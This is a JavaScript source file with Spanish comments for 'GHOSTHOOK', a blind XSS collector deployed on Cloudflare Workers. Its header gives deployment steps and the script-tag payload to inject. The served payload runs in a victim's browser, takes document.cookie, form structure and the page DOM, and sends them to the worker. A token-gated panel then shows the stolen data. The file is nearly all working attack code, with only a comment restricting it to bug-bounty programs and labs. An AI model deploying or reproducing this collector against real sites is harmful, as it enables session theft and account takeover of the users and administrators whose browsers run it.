/* GHOSTHOOK - colector blind XSS gratuito en Cloudflare Workers + KV
 * REGLA: usar SOLO en programas que permiten stored/blind XSS o en labs propios.
 *
 * Deploy (dashboard, sin comandos):
 *   1. Workers & Pages -> Create application -> Create Worker -> nombre "ghosthook" -> Deploy
 *   2. Edit code -> pegar este archivo -> Save and deploy
 *   3. KV -> Create namespace -> nombre "GHOSTHOOK"
 *   4. Worker -> Settings -> Bindings -> Add -> KV Namespace -> Variable name: LOGS -> namespace GHOSTHOOK
 *   5. Cambiar el TOKEN de abajo por uno propio -> Save and deploy
 *   6. El payload del Hunter es: <script src="https://<tu-worker>.workers.dev/x.js"></script>
 */

const TOKEN = "GHOSTHOOK-CAMBIA-ESTE-TOKEN"; // panel de lectura

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const p = url.pathname;
    const self = url.origin; // URL del worker, se inyecta en el payload

    // ---- payload que ejecuta el navegador del admin ----
    if (p === "/x.js") {
      const js = `(function(){
        var W = "${self}";
        var data = {
          t: Date.now(),
          url: location.href,
          title: document.title,
          cookie: document.cookie,
          referrer: document.referrer,
          origin: location.origin,
          ua: navigator.userAgent,
          forms: Array.prototype.slice.call(document.forms).map(function(f){
            return {action: f.action, method: f.method,
                    inputs: Array.prototype.slice.call(f.elements).map(function(e){return e.name+":"+e.type})};
          }),
          dom: document.documentElement.outerHTML.substring(0, 20000)
        };
        try { fetch(W + "/c", {method: "POST", keepalive: true,
              headers: {"Content-Type": "application/json"}, body: JSON.stringify(data)}); }
        catch (e) { try { navigator.sendBeacon(W + "/c", JSON.stringify(data)); } catch (e2) {} }
      })();`;
      return new Response(js, {headers: {
        "Content-Type": "application/javascript",
        "Access-Control-Allow-Origin": "*"}});
    }

    // ---- beacon entrante (fetch POST o sendBeacon) ----
    if (p === "/c") {
      let body = "";
      try { body = await request.text(); } catch (e) { body = ""; }
      if (request.method === "GET" && url.searchParams.get("d")) {
        body = decodeURIComponent(url.searchParams.get("d"));
      }
      if (!body) return new Response("", {status: 204});
      const id = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
      await env.LOGS.put("hit:" + id, body.substring(0, 100000));
      return new Response("", {status: 204,
        headers: {"Access-Control-Allow-Origin": "*"}});
    }

    // ---- panel: lista de beacons ----
    if (p === "/panel") {
      if (url.searchParams.get("token") !== TOKEN) return new Response("no", {status: 403});
      const list = await env.LOGS.list({prefix: "hit:"});
      const rows = [];
      for (const k of list.keys.slice(-50).reverse()) {
        const v = await env.LOGS.get(k.name);
        let j = {}; try { j = JSON.parse(v); } catch (e) { j = {raw: v}; }
        rows.push(`<b>${j.url || "?"}</b>
 cookie: <code>${(j.cookie || "").substring(0, 300)}</code>
 ua: ${j.ua || ""}
 guardado: ${k.name}
 <a href="/hit?k=${k.name}&token=${TOKEN}">ver dump completo</a>
`);
      }
      return new Response("<pre>" + rows.join("\n---\n") + "</pre>",
        {headers: {"Content-Type": "text/html; charset=utf-8"}});
    }

    // ---- un beacon individual ----
    if (p === "/hit") {
      if (url.searchParams.get("token") !== TOKEN) return new Response("no", {status: 403});
      const v = await env.LOGS.get(url.searchParams.get("k"));
      return new Response(v || "no encontrado", {headers: {"Content-Type": "text/plain; charset=utf-8"}});
    }

    return new Response("GHOSTHOOK v1", {status: 200});
  }
};
